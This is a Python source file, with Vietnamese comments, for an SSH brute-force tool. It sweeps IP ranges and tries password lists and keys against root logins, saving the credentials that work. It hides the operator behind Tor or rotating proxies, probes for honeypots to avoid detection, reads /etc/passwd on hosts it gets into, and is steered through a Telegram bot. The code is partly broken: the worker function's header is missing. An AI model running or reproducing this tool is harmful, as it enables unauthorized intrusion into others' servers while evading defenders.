import argparse
import asyncio
import configparser
import datetime
import ipaddress
import json
import logging
import os
import random
import re
import socket
import sqlite3
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional, Dict

import paramiko
import requests
import socks
from fake_useragent import UserAgent
from stem import Signal
from stem.control import Controller
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from paramiko import AuthenticationException, SSHException

# Cấu hình logging với file và console
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('sshV6.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Khóa và biến toàn cục
lock = threading.Lock()
stop_flag = False
ip_block_monitor = False
auto_shutdown_enabled = False
blocked_ips = set()  # Sử dụng set để tránh trùng lặp
leaked_ips = set()
use_tor = False
start_time = time.time()
scanned_ips = 0
total_ips = 0
cache_results = {}
proxy_status = []
running_proxies = []
current_proxy = None
use_proxy = False
ip_list = []
ports = []
key_files = []
args = None
previous_modes = []
stats = {"success": 0, "failed": 0, "honeypot": 0, "errors": 0, "bypassed": 0}
KEY = "ha191229"
users_with_key = {}
ADMIN_ID = None
KEY_INPUT = 0
CONFIG_FILE = "config.ini"
TOR_PORTS_FILE = "tor_ports.txt"
DEFAULT_PORT = 22
DEFAULT_THREADS = 20
DEFAULT_TIMEOUT = 5
DEFAULT_MAX_ATTEMPTS = 20
PROXY_FILES = ["proxy.txt", "socks5.txt", "sock5.txt"]
TOR_PORTS = [9050, 9051, 9052, 9053, 9054, 9055, 9056]
TOR_PROXY = {"host": "127.0.0.1", "port": 9050}
check_banner = False
check_response = False
check_filesystem = False
check_error = False
check_behavior = False
check_prompt = False
check_deep = False
check_network = False
check_connections = False
check_ttl = False
check_response_behavior = False
check_normal = False
check_bypass = False
check_all = False
check_bigscan = False
AVAILABLE_MODES = [
    "banner", "response", "filesystem", "error", "behavior", "prompt",
    "deep", "network", "connections", "ttl", "response_behavior",
    "normal", "bypass", "all", "bigscan"
]
config = None
db_conn = None
db_lock = threading.Lock()

def read_config(file_path: str = CONFIG_FILE) -> dict:
    """Đọc file config.ini với xử lý lỗi chi tiết hơn"""
    global config, ADMIN_ID
    config = configparser.ConfigParser()
    try:
        if not os.path.exists(file_path):
            logger.error(f"File config {file_path} không tồn tại! Tạo file mẫu...")
            with open(file_path, 'w') as f:
                config['Proxy'] = {"type": "socks5", "host": "127.0.0.1", "port": "1080"}
                config['Telegram'] = {"token": "", "admin_id": ""}
                config['Tor'] = {"port": "9050"}
                config['Settings'] = {"threads": "20", "timeout": "5", "max_attempts": "20", "ports": "22,2222"}
                config.write(f)
            logger.error("Vui lòng cấu hình file config.ini trước khi chạy lại!")
            sys.exit(1)
        config.read(file_path)
        ADMIN_ID = config.get("Telegram", "admin_id", fallback=None)
        return {
            "proxy_type": config.get("Proxy", "type", fallback="socks5"),
            "proxy_host": config.get("Proxy", "host", fallback="127.0.0.1"),
            "proxy_port": config.getint("Proxy", "port", fallback=1080),
            "proxy_user": config.get("Proxy", "user", fallback=None),
            "proxy_pass": config.get("Proxy", "pass", fallback=None),
            "telegram_token": config.get("Telegram", "token", fallback=None),
            "admin_id": ADMIN_ID,
            "tor_port": config.getint("Tor", "port", fallback=9050),
            "threads": config.getint("Settings", "threads", fallback=DEFAULT_THREADS),
            "timeout": config.getint("Settings", "timeout", fallback=DEFAULT_TIMEOUT),
            "max_attempts": config.getint("Settings", "max_attempts", fallback=DEFAULT_MAX_ATTEMPTS),
            "ports": [int(p) for p in config.get("Settings", "ports", fallback="22,2222").split(",")]
        }
    except Exception as e:
        logger.error(f"Lỗi khi đọc config: {e}")
        sys.exit(1)

def init_db():
    """Khởi tạo cơ sở dữ liệu SQLite với kiểm tra thread an toàn"""
    global db_conn
    try:
        db_conn = sqlite3.connect('ssh_results.db', check_same_thread=False)
        cursor = db_conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                port INTEGER NOT NULL,
                status TEXT NOT NULL,
                banner TEXT,
                timestamp TEXT NOT NULL
            )
        ''')
        db_conn.commit()
        logger.info("Khởi tạo cơ sở dữ liệu thành công")
    except Exception as e:
        logger.error(f"Lỗi khi khởi tạo DB: {e}")
        db_conn = None

def save_to_db(ip: str, port: int, status: str, banner: str = ""):
    """Lưu kết quả vào SQLite với xử lý ngoại lệ"""
    if not db_conn:
        return
    with db_lock:
        try:
            cursor = db_conn.cursor()
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            cursor.execute(
                "INSERT INTO results (ip, port, status, banner, timestamp) VALUES (?, ?, ?, ?, ?)",
                (ip, port, status, banner, timestamp)
            )
            db_conn.commit()
            logger.info(f"Đã lưu kết quả vào DB: {ip}:{port} - {status}")
        except Exception as e:
            logger.error(f"Lỗi khi lưu vào DB: {e}")

def read_file(file_path: str) -> List[str]:
    """Đọc file chứa IP hoặc port với kiểm tra định dạng"""
    try:
        with open(file_path, 'r') as f:
            ip_port_pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d{1,5})?$')
            return [line.strip() for line in f if line.strip() and ip_port_pattern.match(line) and not line.startswith('#')]
    except FileNotFoundError:
        logger.error(f"File {file_path} không tồn tại!")
        return []
    except Exception as e:
        logger.error(f"Lỗi khi đọc file {file_path}: {e}")
        return []

def check_port(ip: str, port: int) -> bool:
    """Kiểm tra cổng mở bằng socket với timeout ngắn"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex((ip, port))
    sock.close()
    return result == 0

def setup_proxy(proxy: Dict) -> bool:
    """Cấu hình proxy hoặc Tor"""
    global current_proxy
    try:
        if proxy and proxy.get("host"):
            socks.set_default_proxy(
                socks.SOCKS5 if proxy.get("type", "socks5") == "socks5" else socks.HTTP,
                proxy["host"],
                proxy["port"],
                True,
                proxy.get("user"),
                proxy.get("pass")
            )
            socket.socket = socks.socksocket
            current_proxy = proxy
            logger.info(f"Cấu hình proxy thành công: {proxy['host']}:{proxy['port']}")
            return True
        else:
            socket.socket = socket._socket.socket
            current_proxy = None
            logger.info("Chuyển sang kết nối trực tiếp")
            return True
    except Exception as e:
        logger.error(f"Lỗi cấu hình proxy: {e}")
        current_proxy = None
        return False

def check_proxy(proxy: Dict) -> Dict:
    """Kiểm tra trạng thái proxy"""
    proxy_info = {
        "host": proxy["host"],
        "port": proxy["port"],
        "status": "dead",
        "ping": "N/A",
        "speed": "N/A"
    }
    try:
        start_time = time.time()
        sock = socks.socksocket()
        sock.set_proxy(socks.SOCKS5, proxy["host"], proxy["port"])
        sock.settimeout(5)
        sock.connect(("8.8.8.8", 443))
        sock.send(b"GET / HTTP/1.1\r\nHost: 8.8.8.8\r\n\r\n")
        sock.recv(1024)
        sock.close()
        ping = (time.time() - start_time) * 1000
        speed = 1000 / ping if ping > 0 else 999
        proxy_info["status"] = "alive"
        proxy_info["ping"] = f"{ping:.2f} ms"
        proxy_info["speed"] = f"{speed:.2f} req/s"
    except Exception as e:
        logger.error(f"Proxy check failed for {proxy['host']}:{proxy['port']}: {e}")
    return proxy_info

def check_tor(port: int) -> Dict:
    """Kiểm tra trạng thái Tor"""
    try:
        with Controller.from_port(port=port + 1) as controller:
            controller.authenticate()
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, TOR_PROXY["host"], port)
            sock.settimeout(5)
            sock.connect(("check.torproject.org", 443))
            sock.send(b"GET /api/ip HTTP/1.1\r\nHost: check.torproject.org\r\n\r\n")
            response = sock.recv(1024).decode()
            sock.close()
            if '"IsTor":true' in response:
                start_time = time.time()
                sock.connect(("8.8.8.8", 443))
                ping = (time.time() - start_time) * 1000
                speed = 1000 / ping if ping > 0 else 999
                return {
                    "host": TOR_PROXY["host"],
                    "port": port,
                    "status": "alive",
                    "ping": f"{ping:.2f} ms",
                    "speed": f"{speed:.2f} req/s"
                }
    except Exception as e:
        logger.error(f"Tor check failed for port {port}: {e}")
    return {
        "host": TOR_PROXY["host"],
        "port": port,
        "status": "dead",
        "ping": "N/A",
        "speed": "N/A"
    }

def check_ip_leak() -> tuple[bool, str]:
    """Kiểm tra rò rỉ IP khi sử dụng proxy/Tor"""
    try:
        proxies = None
        if use_proxy and current_proxy:
            proxies = {"http": f"socks5://{current_proxy['host']}:{current_proxy['port']}"}
        elif use_tor:
            proxies = {"http": f"socks5://{TOR_PROXY['host']}:{TOR_PROXY['port']}"}
        response = requests.get("https://api.ipify.org?format=json", timeout=5, proxies=proxies)
        ip = response.json()["ip"]
        return (ip in blocked_ips or ip in leaked_ips), ip
    except Exception:
        return False, "Unknown"

def expand_cidr(cidr: str) -> List[str]:
    """Mở rộng CIDR thành danh sách IP"""
    try:
        network = ipaddress.ip_network(cidr, strict=False)
        return [str(ip) for ip in network.hosts()]
    except ValueError:
        logger.error(f"Invalid CIDR: {cidr}")
        return []

def get_ttl(ip: str) -> Optional[int]:
    """Lấy TTL từ ping"""
    try:
        ping_process = os.popen(f"ping -c 1 {ip}")
        output = ping_process.read()
        ttl_line = [line for line in output.splitlines() if "ttl=" in line.lower()]
        return int(ttl_line[0].split("ttl=")[1].split()[0]) if ttl_line else None
    except Exception:
        return None

def is_honeypot_banner(ip: str, port: int) -> bool:
    """Kiểm tra honeypot dựa trên banner"""
    try:
        sock = socket.create_connection((ip, port), timeout=5)
        banner = sock.recv(1024).decode(errors='ignore').strip()
        sock.close()
        honeypot_signatures = ["Cowrie", "Kippo", "Dionaea", "Honey", "Cisco SSH"]
        suspicious_keywords = ["auth", "alert", "monitor", "log", "unauthorized"]
        if any(sig in banner for sig in honeypot_signatures) or any(kw in banner.lower() for kw in suspicious_keywords):
            with open('honeypot.txt', 'a') as f:
                f.write(f"{ip}:{port} → 🚩 Suspicious SSH banner: '{banner[:100]}'\n")
            return True
        return False
    except Exception:
        return False

def is_honeypot_response_time(ip: str, port: int) -> bool:
    """Kiểm tra honeypot dựa trên thời gian phản hồi"""
    try:
        start_time = time.time()
        sock = socket.create_connection((ip, port), timeout=5)
        sock.recv(1024)
        sock.close()
        return (time.time() - start_time) > 2.0 or (time.time() - start_time) < 0.05
    except Exception:
        return False

def is_honeypot_filesystem(ip: str, port: int, username: str, password: str) -> bool:
    """Kiểm tra honeypot dựa trên hệ thống file"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        stdin, stdout, stderr = ssh.exec_command('ls /', timeout=5)
        output_root = stdout.read().decode().strip()
        ssh.close()
        return len(output_root.split()) < 3
    except Exception:
        return False

def is_honeypot_error_messages(ip: str, port: int, username: str, password: str) -> bool:
    """Kiểm tra honeypot dựa trên thông báo lỗi"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password="wrongpass", timeout=5)
        ssh.close()
        return True
    except AuthenticationException:
        return False
    except Exception:
        return True

def is_honeypot_behavior(ip: str, port: int, username: str, password: str) -> bool:
    """Kiểm tra honeypot dựa trên hành vi lệnh"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        stdin, stdout, stderr = ssh.exec_command('echo hello', timeout=5)
        output = stdout.read().decode().strip()
        ssh.close()
        return "hello" not in output.lower()
    except Exception:
        return False

def is_honeypot_prompt(ip: str, port: int, username: str, password: str) -> bool:
    """Kiểm tra honeypot dựa trên prompt shell"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        channel = ssh.invoke_shell()
        time.sleep(1)
        output = channel.recv(1024).decode(errors='ignore').strip()
        channel.close()
        ssh.close()
        return not any(indicator in output for indicator in ['~', '#', '$', '@'])
    except Exception:
        return False

def is_honeypot_deep_check(ip: str, port: int, username: str, password: str) -> bool:
    """Kiểm tra honeypot sâu với uname và passwd"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=6)
        stdin, stdout, stderr = ssh.exec_command("uname -a", timeout=5)
        uname_output = stdout.read().decode().lower()
        if any(kw in uname_output for kw in ["honeypot", "alert", "monitor"]):
            ssh.close()
            return True
        stdin, stdout, stderr = ssh.exec_command("cat /etc/passwd", timeout=5)
        passwd_output = stdout.read().decode().strip()
        passwd_lines = [line for line in passwd_output.splitlines() if ":" in line]
        ssh.close()
        return len(passwd_lines) < 3
    except Exception:
        return True

def is_honeypot_ttl(ip: str, port: int) -> bool:
    """Kiểm tra honeypot dựa trên TTL"""
    ttl = get_ttl(ip)
    return ttl is not None and (ttl < 32 or ttl > 128)

def is_honeypot(ip: str, port: int, username: str, password: str) -> List[str]:
    """Kiểm tra tổng hợp các dấu hiệu honeypot"""
    reasons = []
    if check_banner and is_honeypot_banner(ip, port):
        reasons.append("🚩 Suspicious SSH banner")
    if check_response and is_honeypot_response_time(ip, port):
        reasons.append("🐢 Abnormal response time")
    if check_filesystem and is_honeypot_filesystem(ip, port, username, password):
        reasons.append("📂 Fake or empty filesystem")
    if check_error and is_honeypot_error_messages(ip, port, username, password):
        reasons.append("🔓 Abnormal login error")
    if check_behavior and is_honeypot_behavior(ip, port, username, password):
        reasons.append("⚙️ Abnormal command behavior")
    if check_prompt and is_honeypot_prompt(ip, port, username, password):
        reasons.append("📜 Missing shell prompt")
    if check_deep and is_honeypot_deep_check(ip, port, username, password):
        reasons.append("🧪 Suspicious deep check")
    if check_ttl and is_honeypot_ttl(ip, port):
        reasons.append("⏱ Abnormal TTL")
    return reasons

def check_ssh(ip: str, port: int, username: str, password: Optional[str] = None, key_file: Optional[str] = None) -> bool:
    """Kiểm tra kết nối SSH và lưu kết quả"""
    global stats, cache_results
    if (ip, port, username) in cache_results:
        return cache_results[(ip, port, username)]

    if not check_port(ip, port):
        logger.error(f"[NO SSH SERVICE] {ip}:{port} | Port not open")
        with lock:
            stats["errors"] += 1
        save_to_db(ip, port, "failed", "")
        return False

    honeypot_reasons = is_honeypot(ip, port, username, password or "dummy")
    if honeypot_reasons and not check_normal:
        reason_text = " | ".join(honeypot_reasons)
        logger.warning(f"[HONEYPOT] {ip}:{port} | {username} | {password or key_file} → {reason_text}")
        with open('honeypot.txt', 'a') as f:
            f.write(f"{ip}:{port} | {username} | {password or key_file} → {reason_text}\n")
        with lock:
            stats["honeypot"] += 1
        save_to_db(ip, port, "honeypot", reason_text)
        return False

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        if key_file:
            ssh.connect(ip, port=port, username=username, key_filename=key_file, timeout=DEFAULT_TIMEOUT)
        else:
            ssh.connect(ip, port=port, username=username, password=password, timeout=DEFAULT_TIMEOUT)
        banner = ssh.get_transport().get_banner().decode(errors='ignore') if hasattr(ssh.get_transport(), 'get_banner') else ""
        logger.info(f"[SUCCESS] {ip}:{port} | {username} | {password or key_file} | Banner: {banner[:50]}")
        with open('success.txt', 'a') as f:
            f.write(f"{ip}:{port} | {username} | {password or key_file} | Banner: {banner[:50]}\n")
        with lock:
            stats["success"] += 1
        save_to_db(ip, port, "success", banner)
        return True
    except AuthenticationException:
        logger.info(f"[FAILED] {ip}:{port} | {username} | {password or key_file}")
        with lock:
            stats["failed"] += 1
        save_to_db(ip, port, "failed", "")
        return False
    except SSHException as e:
        logger.error(f"[SSH ERROR] {ip}:{port} | {username} | {password or key_file} | {e}")
        with lock:
            stats["errors"] += 1
        save_to_db(ip, port, "error", str(e))
        return False
    except Exception as e:
        logger.error(f"[CONNECTION ERROR] {ip}:{port} | {username} | {password or key_file} | {e}")
        with lock:
            stats["errors"] += 1
        save_to_db(ip, port, "error", str(e))
        return False
    finally:
        ssh.close()

    """Worker để quét SSH"""
    global stop_flag, scanned_ips
    if stop_flag:
        return
    attempts = 0
    for password in passwords:
        if stop_flag or attempts >= DEFAULT_MAX_ATTEMPTS:
            break
        if check_ssh(ip, port, username, password):
            break
        attempts += 1
        time.sleep(random.uniform(0.05, 0.15))
    if key_files:
        for key_file in key_files:
            if stop_flag:
                break
            if check_ssh(ip, port, username, key_file=key_file):
                break
    with lock:
        scanned_ips += 1

async def start(update: Update, context):
    """Bắt đầu bot Telegram và yêu cầu key"""
    global ADMIN_ID
    if not ADMIN_ID or str(update.effective_user.id) == ADMIN_ID:
        await update.message.reply_text("Vui lòng nhập key để xác thực:")
        return KEY_INPUT
    await update.message.reply_text("Bạn không có quyền truy cập!")
    return ConversationHandler.END

async def check_key(update: Update, context):
    """Kiểm tra key nhập vào"""
    global users_with_key, ADMIN_ID
    user_id = str(update.effective_user.id)
    if update.message.text.strip() == KEY:
        users_with_key[user_id] = True
        await update.message.reply_text("Xác thực thành công! Sử dụng /menu để tiếp tục.")
        return ConversationHandler.END
    else:
        await update.message.reply_text("Key không đúng! Vui lòng thử lại hoặc liên hệ admin.")
        return KEY_INPUT

async def tor_command(update: Update, context):
    """Chọn và kết nối đến Tor port"""
    if str(update.effective_user.id) not in users_with_key and str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("Unauthorized user!")
        return
    if not context.args or not context.args[0].isdigit():
        keyboard = [
            [InlineKeyboardButton(f"Port {port}", callback_data=f"tor_{port}") for port in TOR_PORTS]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Chọn Tor port:", reply_markup=reply_markup)
        return
    port = int(context.args[0])
    if port in TOR_PORTS:
        success, message = connect_tor_port(port, update, context)
        if not success:
            await update.message.reply_text(message)
    else:
        await update.message.reply_text(f"Port {port} không nằm trong danh sách Tor ports: {TOR_PORTS}")

async def tor_button(update: Update, context):
    """Xử lý chọn Tor port từ nút"""
    query = update.callback_query
    await query.answer()
    port = int(query.data.split("_")[1])
    success, message = connect_tor_port(port, update, context)
    if not success:
        await query.edit_message_text(message)
    else:
        await query.edit_message_text(message)

def connect_tor_port(port: int, update: Update, context):
    """Kết nối đến Tor port cụ thể"""
    global use_tor, TOR_PROXY, stop_flag
    stop_flag = True
    time.sleep(1)
    TOR_PROXY["port"] = port
    status = check_tor(port)
    if status["status"] == "alive":
        try:
            with Controller.from_port(port=port + 1) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
            use_tor = True
            use_proxy = False
            setup_proxy(TOR_PROXY)
            stop_flag = False
            return True, f"Đã kết nối thành công đến Tor port {port} (Ping: {status['ping']}, Speed: {status['speed']})"
        except Exception as e:
            logger.error(f"Failed to signal NEWNYM for port {port}: {e}")
            if update and context:
                return False, f"Lỗi khi kết nối Tor port {port}: {str(e)}"
    for alt_port in TOR_PORTS:
        if alt_port != port and check_tor(alt_port)["status"] == "alive":
            try:
                with Controller.from_port(port=alt_port + 1) as controller:
                    controller.authenticate()
                    controller.signal(Signal.NEWNYM)
                TOR_PROXY["port"] = alt_port
                use_tor = True
                use_proxy = False
                setup_proxy(TOR_PROXY)
                stop_flag = False
                return True, f"Không kết nối được port {port}. Đã thay thế Tor port {alt_port} (Ping: {check_tor(alt_port)['ping']}, Speed: {check_tor(alt_port)['speed']})"
            except Exception as e:
                logger.error(f"Failed to signal NEWNYM for port {alt_port}: {e}")
    stop_flag = False
    with lock:
        stats["errors"] += 1
    return False, f"Không kết nối được đến port {port}. Không tìm thấy port Tor thay thế."

async def mode_command(update: Update, context):
    """Thay đổi chế độ quét"""
    if str(update.effective_user.id) not in users_with_key and str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("Unauthorized user!")
        return
    keyboard = [
        [InlineKeyboardButton(mode, callback_data=f"mode_{mode}") for mode in AVAILABLE_MODES[i:i+2]]
        for i in range(0, len(AVAILABLE_MODES), 2)
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Chọn chế độ quét:", reply_markup=reply_markup)

async def mode_button(update: Update, context):
    """Xử lý chọn chế độ từ nút"""
    query = update.callback_query
    await query.answer()
    mode = query.data.split("_")[1]
    global check_banner, check_response, check_filesystem, check_error, check_behavior, check_prompt
    global check_deep, check_network, check_connections, check_ttl, check_response_behavior, check_normal
    global check_bypass, check_all, check_bigscan
    if mode == "all":
        check_all = True
        check_banner = check_response = check_filesystem = check_error = check_behavior = check_prompt = True
        check_deep = check_network = check_connections = check_ttl = check_response_behavior = check_normal = True
        check_bypass = check_bigscan = True
    else:
        vars()[f"check_{mode}"] = not vars()[f"check_{mode}"]
        if mode == "all":
            check_all = False
            check_banner = check_response = check_filesystem = check_error = check_behavior = check_prompt = False
            check_deep = check_network = check_connections = check_ttl = check_response_behavior = check_normal = False
            check_bypass = check_bigscan = False
    active_modes = [m for m, v in globals().items() if m.startswith('check_') and v]
    await query.edit_message_text(f"Chế độ đã cập nhật: {', '.join(active_modes)}")

async def status_command(update: Update, context):
    """Hiển thị trạng thái tool"""
    if str(update.effective_user.id) not in users_with_key and str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("Unauthorized user!")
        return
    uptime_seconds = int(time.time() - start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    proxy_text = "🔴 Không sử dụng"
    if use_tor:
        proxy_text = f"🟢 Tor ({TOR_PROXY['host']}:{TOR_PROXY['port']}, Ping: {next((p['ping'] for p in proxy_status if p['port'] == TOR_PROXY['port']), 'N/A')})"
    elif use_proxy and current_proxy:
        proxy_text = f"🟢 Proxy ({current_proxy['host']}:{current_proxy['port']}, Ping: {next((p['ping'] for p in proxy_status if p['host'] == current_proxy['host'] and p['port'] == current_proxy['port']), 'N/A')})"
    status_text = (
        f"📊 [ SSHV6 Tool Status - {datetime.datetime.now().strftime('%H:%M:%S %d/%m/%Y')} ]\n\n"
        f"🧠 Threads: {DEFAULT_THREADS} ({'đang quét' if not stop_flag else 'không hoạt động'})\n"
        f"🧪 Max Attempts: {DEFAULT_MAX_ATTEMPTS} mỗi IP\n"
        f"⏱ Timeout: {DEFAULT_TIMEOUT}s\n"
        f"🌐 IPs Quét: {scanned_ips}/{total_ips} ({(scanned_ips/total_ips*100):.2f}%)\n"
        f"🕵️ Proxy: {proxy_text}\n"
        f"📁 SSH Key Files: {', '.join(key_files) or 'Không có'}\n"
        f"📩 Bot Telegram: {'✅ Đang chạy (Admin ID: ' + ADMIN_ID + ')' if ADMIN_ID else '🔴 Không chạy'}\n"
        f"💥 IP Block Monitor: {'🟢 Bật' if ip_block_monitor else '🔴 Tắt'}\n"
        f"📅 Uptime: {uptime}\n"
        f"📁 Logs: success.txt, honeypot.txt, sshV6.log\n"
        f"📊 Stats: Success={stats['success']}, Failed={stats['failed']}, Honeypot={stats['honeypot']}, Errors={stats['errors']}"
    )
    await update.message.reply_text(status_text, parse_mode="Markdown")

async def send_to_telegram(message: str):
    """Gửi thông báo qua Telegram"""
    if config and config["telegram_token"] and ADMIN_ID:
        try:
            app = Application.builder().token(config["telegram_token"]).build()
            await app.bot.send_message(chat_id=ADMIN_ID, text=message, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Lỗi gửi tin nhắn Telegram: {e}")

def main():
    """Hàm chính để chạy tool"""
    global config, args, ip_list, ports, key_files
    config = read_config()
    init_db()
    parser = argparse.ArgumentParser(description="SSH Brute Force Tool with Honeypot Detection")
    parser.add_argument("--ip", help="IP hoặc CIDR range (e.g., 192.168.1.1 or 192.168.1.0/24)")
    parser.add_argument("--ip-file", help="File chứa danh sách IP")
    parser.add_argument("--port-file", help="File chứa danh sách port")
    parser.add_argument("--password-file", help="File chứa danh sách mật khẩu")
    parser.add_argument("--key-file", help="File chứa key SSH")
    parser.add_argument("--username", default="root", help="Tên người dùng (mặc định: root)")
    parser.add_argument("--tor", action="store_true", help="Sử dụng Tor")
    parser.add_argument("--tor-port", type=int, default=9050, help="Port Tor (mặc định: 9050)")
    parser.add_argument("--proxy-file", help="File chứa danh sách proxy")
    parser.add_argument("--banner", action="store_true", help="Kiểm tra banner")
    parser.add_argument("--response", action="store_true", help="Kiểm tra thời gian phản hồi")
    parser.add_argument("--filesystem", action="store_true", help="Kiểm tra hệ thống file")
    parser.add_argument("--error", action="store_true", help="Kiểm tra thông báo lỗi")
    parser.add_argument("--behavior", action="store_true", help="Kiểm tra hành vi")
    parser.add_argument("--prompt", action="store_true", help="Kiểm tra prompt")
    parser.add_argument("--deep", action="store_true", help="Kiểm tra sâu")
    parser.add_argument("--network", action="store_true", help="Kiểm tra mạng")
    parser.add_argument("--connections", action="store_true", help="Kiểm tra kết nối")
    parser.add_argument("--ttl", action="store_true", help="Kiểm tra TTL")
    parser.add_argument("--response-behavior", action="store_true", help="Kiểm tra hành vi phản hồi")
    parser.add_argument("--normal", action="store_true", help="Bỏ qua honeypot")
    parser.add_argument("--bypass", action="store_true", help="Bypass kiểm tra")
    parser.add_argument("--all", action="store_true", help="Kích hoạt tất cả chế độ")
    parser.add_argument("--bigscan", action="store_true", help="Chế độ quét lớn")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Số thread (mặc định: 20)")
    args = parser.parse_args()

    # Cấu hình chế độ
    check_banner = args.banner
    check_response = args.response
    check_filesystem = args.filesystem
    check_error = args.error
    check_behavior = args.behavior
    check_prompt = args.prompt
    check_deep = args.deep
    check_network = args.network
    check_connections = args.connections
    check_ttl = args.ttl
    check_response_behavior = args.response_behavior
    check_normal = args.normal
    check_bypass = args.bypass
    check_all = args.all
    check_bigscan = args.bigscan

    # Load IPs
    if args.ip:
        ip_list = [args.ip] if not '/' in args.ip else expand_cidr(args.ip)
    elif args.ip_file:
        ip_list = read_file(args.ip_file)
    else:
        ip_list = expand_cidr("172.0.0.0/16")
    total_ips = len(ip_list)

    # Load ports
    if args.port_file:
        ports = [int(p) for p in read_file(args.port_file) if p.isdigit()]
    else:
        ports = config.get("ports", [DEFAULT_PORT])

    # Load passwords
    passwords = read_file(args.password_file) if args.password_file else ["admin", "password", "123456"]

    # Load key files
    if args.key_file:
        key_files = [args.key_file]

    # Cấu hình proxy/Tor
    if args.tor:
        use_tor = True
        TOR_PROXY["port"] = args.tor_port
        if check_tor(args.tor_port)["status"] != "alive":
            logger.error("Không thể kết nối Tor. Thoát.")
            sys.exit(1)
        setup_proxy(TOR_PROXY)
    elif args.proxy_file:
        use_proxy = True
        proxies = read_file(args.proxy_file)
        proxies = [p.split(":") for p in proxies if ":" in p]
        proxies = [{"host": p[0], "port": int(p[1]), "type": "socks5"} for p in proxies if len(p) == 2]
        if proxies:
            proxy_status.extend([check_proxy(p) for p in proxies])
            alive_proxies = [p for p in proxy_status if p["status"] == "alive"]
            if alive_proxies:
                alive_proxies.sort(key=lambda x: float(x["speed"].split()[0]) if x["speed"] != "N/A" else 0, reverse=True)
                setup_proxy(alive_proxies[0])
            else:
                logger.info("Không tìm thấy proxy hoạt động. Chuyển sang kết nối trực tiếp.")
                use_proxy = False
        else:
            logger.info("File proxy rỗng hoặc không hợp lệ. Chuyển sang kết nối trực tiếp.")
            use_proxy = False

    # Kiểm tra IP leak
    if use_tor or use_proxy:
        is_leaked, ip = check_ip_leak()
        if is_leaked:
            logger.error(f"Rò rỉ IP: {ip}")
            asyncio.run(send_to_telegram(f"<b>Rò rỉ IP</b>: {ip}"))
            sys.exit(1)

    # Khởi động quét
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for ip in ip_list:
            for port in ports:
                futures.append(executor.submit(brute_worker, ip, port, args.username, passwords, key_files))
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"Lỗi trong quá trình quét: {e}")
            with lock:
                scanned_ips += 1

    # Lưu kết quả và đóng DB
    save_results()
    if db_conn:
        db_conn.close()
    logger.info("Quét hoàn tất.")

def save_results():
    """Lưu thống kê vào file JSON"""
    with lock:
        try:
            with open('results.json', 'w') as f:
                json.dump({
                    "stats": stats,
                    "scanned_ips": scanned_ips,
                    "total_ips": total_ips,
                    "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }, f, indent=4)
            logger.info("Kết quả đã được lưu vào results.json")
        except Exception as e:
            logger.error(f"Lỗi khi lưu kết quả: {e}")

if __name__ == "__main__":
    main()
